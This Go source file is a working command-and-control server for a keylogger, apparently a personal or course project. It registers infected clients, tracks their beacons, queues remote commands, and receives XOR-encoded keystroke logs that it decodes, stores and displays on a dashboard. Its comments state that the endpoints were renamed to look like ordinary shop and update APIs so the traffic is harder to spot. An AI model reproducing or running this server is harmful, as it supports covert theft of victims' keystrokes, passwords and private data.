package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"sync"
	"time"
)

/*
creates a client struct that stores the ID, time it was last seen,
commands it got sent and the duration for the sleep command

when client is registered, it would create a client object
*/
type Client struct {
	ID       string
	LastSeen time.Time
	Command  string
	Duration int
	Key      byte
}

/*
creates a struct for the client view for the html site

its an easy way to manage what gets seen per div in the html file
*/
type ClientView struct {
	ID       string
	LastSeen string
}

/*
creates a map of clients. Also creates a mutex exclusion for
transaction management and concurrancy control.

the lock locks the clients map when a transaction happens
incase another client works on it and changes something and
this one wants gets wrong data
*/
var (
	clients     map[string]*Client
	clientsLock sync.Mutex
)

/*
initializes the client map
*/
func init() {
	clients = make(map[string]*Client)
}

/*
decodes the files coming in using XOR decoding refered to  https://www.youtube.com/watch?v=AMjC6kgoBD8&t=3s
*/
func decode(cipherText []byte, key byte) string {
	plainText := make([]byte, len(cipherText))

	for i := 0; i < len(cipherText); i++ {
		c := cipherText[i]
		plainText[i] = c ^ key
	}

	decodeedStr := ""
	for _, b := range plainText {
		decodeedStr += string(rune(b))
	}

	return decodeedStr
}

/*
registers the client with the server.
checks if the client is already registered, then returns an error if it is.

allows the server to easily look up clients and send commmands if needed

also gets the decoding keys from the client and stores it in the client struct
*/
func registerHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("d")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	key := r.URL.Query().Get("c")
	if key == "" {
		http.Error(w, "Client key not provided", http.StatusBadRequest)
		return
	}

	if key == "" {
		http.Error(w, "Key not provided", http.StatusBadRequest)
		return
	}

	parsedInt, _ := strconv.ParseUint(key, 16, 8)
	byteVal := byte(parsedInt)
	encyptionKey := byteVal

	clientsLock.Lock()
	defer clientsLock.Unlock()

	if _, exists := clients[clientID]; exists {
		http.Error(w, "Client already registered", http.StatusBadRequest)
		return
	}

	clients[clientID] = &Client{ID: clientID, LastSeen: time.Now(), Key: encyptionKey}
	fmt.Printf("Client registered: %s\n", clientID)
	fmt.Fprintf(w, "Client registered: %s", clientID)
}

/*
unregisters client from the server. returns error if client doesnt exist

when the client quits, it would get removed from the registered clients
so we dont see any dead clients
*/
func unregisterHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("d")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	if _, exists := clients[clientID]; !exists {
		http.Error(w, "Client not found", http.StatusBadRequest)
		return
	}

	delete(clients, clientID)
	fmt.Printf("Client unregistered: %s\n", clientID)
	fmt.Fprintf(w, "Client unregistered: %s", clientID)
}

/*
hands the beacon coming from the client and prints out the ID and time when the beacon
was sent.

this allows us to know if the client is still active. Ideally I'd put a function in
that checks for stale clients
*/
func beaconHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("d")
	beaconTime := r.URL.Query().Get("t")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	if client, exists := clients[clientID]; exists {
		client.LastSeen = time.Now()
		fmt.Printf("Beacon received from client %s at %s\n", clientID, beaconTime)
		fmt.Fprintf(w, "Beacon received from client %s", clientID)
	} else {
		http.Error(w, "Client not found", http.StatusNotFound)
	}
}

/*
sets commands that need to be sent to clients
checks for a password so only the server owner can send commands
returns errors if client doesnt exist in the clients map

the password is set so people cant just curl other peoples client stuff
*/
func commandHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	command := r.URL.Query().Get("cmd")
	password := r.URL.Query().Get("password")

	if clientID == "" || command == "" {
		http.Error(w, "Client ID or Command not provided", http.StatusBadRequest)
		return
	}

	if password == "" || password != "password" {
		http.Error(w, "Wrong passowrd provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	client, exists := clients[clientID]
	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	if command == "slp" {
		duration := r.URL.Query().Get("duration")
		if duration == "" {
			http.Error(w, "Duration not provided for sleep command", http.StatusBadRequest)
			return
		}
		client.Command = fmt.Sprintf("slp %s", duration)
		fmt.Printf("Client %s instructed to sleep for %s seconds\n", clientID, duration)
	} else {
		client.Command = command
	}

	fmt.Printf("Command '%s' sent to client %s\n", command, clientID)
	fmt.Fprintf(w, "Command '%s' sent to client %s", command, clientID)
}

/*
allows clients to retrieve the commands sent to them
deletes the commands after the command is retrieved
throws errors if client isnt registered
*/
func getCommandHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("d")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	client, exists := clients[clientID]
	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	fmt.Fprintf(w, client.Command)

	client.Command = ""
}

/*
returns an htmx template to serve the server owner as the command center
referred to https://www.youtube.com/watch?v=F9H6vYelYyU for insperation
*/
func homeHandler(w http.ResponseWriter, r *http.Request) {
	type ViewData struct {
		Clients []ClientView
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	var clientViews []ClientView
	for _, client := range clients {
		clientViews = append(clientViews, ClientView{
			ID:       client.ID,
			LastSeen: client.LastSeen.Format(time.RFC3339),
		})
	}

	data := ViewData{
		Clients: clientViews,
	}

	templ := template.Must(template.ParseFiles("server.html"))
	templ.Execute(w, data)
}

/*
handles the keylog file when sent to server
refered to  https://stackoverflow.com/questions/44173461/copy-a-file-from-client-to-server-via-rest-end-point-using-golang
for help

it decodes them because theyre encrypted when sent it
*/
func uploadHandler(w http.ResponseWriter, r *http.Request) {
	// Get clientID from query parameter or form data
	clientID := r.FormValue("id")
	if clientID == "" {
		http.Error(w, "Missing clientID", http.StatusBadRequest)
		return
	}

	client := clients[clientID]

	file, handler, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Unable to retrieve file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	var buf bytes.Buffer
	_, err = io.Copy(&buf, file)
	if err != nil {
		log.Printf("Failed to read file: %v", err)
		http.Error(w, "Failed to read file", http.StatusInternalServerError)
		return
	}

	decodeedContent := decode(buf.Bytes(), client.Key)

	fileName := fmt.Sprintf("%s_%s.log", handler.Filename, clientID)
	f, err := os.OpenFile(fileName, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0666)
	if err != nil {
		log.Printf("Failed to create file: %v", err)
		http.Error(w, "Failed to create file", http.StatusInternalServerError)
		return
	}
	defer f.Close()

	_, err = f.Write([]byte(decodeedContent))
	if err != nil {
		log.Printf("Failed to save file: %v", err)
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}

	log.Printf("File uploaded successfully: %s", fileName)
	fmt.Fprintf(w, "File uploaded successfully\n")
}

/*
returns the keylog file for the client when requested with a get

mostly for the html file
*/
func getKeylogsHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println("keylogFilePath")
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	keylogFilePath := fmt.Sprintf("error.log_%s.log", clientID)
	fmt.Println(keylogFilePath)
	data, err := os.ReadFile(keylogFilePath)
	if err != nil {
		http.Error(w, "Failed to read keylog file", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.Write(data)
}

/*
Main function, sets up routers, certs and cert pools for tls
Also declares handler functions
refered to https://www.youtube.com/watch?v=VF7lof3bSfE for insperation

used endpoints with the /api/vi/ naming convention because theyre really
common. Used different names so it doesnt look like its from the same thing.
*/
func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/api/v1/register", registerHandler)           // used to be /register
	mux.HandleFunc("/api/v1/shop/delete-item", unregisterHandler) //used to be /unregister
	mux.HandleFunc("/api/v1/status", beaconHandler)               // used to be /beacon
	mux.HandleFunc("/command", commandHandler)
	mux.HandleFunc("/api/v2/update", getCommandHandler) //used to be /getCommand
	mux.HandleFunc("/getKeylogs", getKeylogsHandler)
	mux.HandleFunc("/store/update", uploadHandler)
	mux.HandleFunc("/clients", homeHandler)

	certFile := "server.crt"
	keyFile := "server.key"
	caCertPath := "ca.crt"

	caCert, err := os.ReadFile(caCertPath)
	if err != nil {
		log.Println(err)
		return
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	cfg := &tls.Config{
		ClientAuth: tls.RequireAndVerifyClientCert,
		ClientCAs:  caCertPool,
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS12,
	}
	srv := &http.Server{
		Addr:      ":8443",
		Handler:   mux,
		TLSConfig: cfg,
	}

	fmt.Println("C&C server listening on :8443...")
	log.Fatal(srv.ListenAndServeTLS(certFile, keyFile))
}
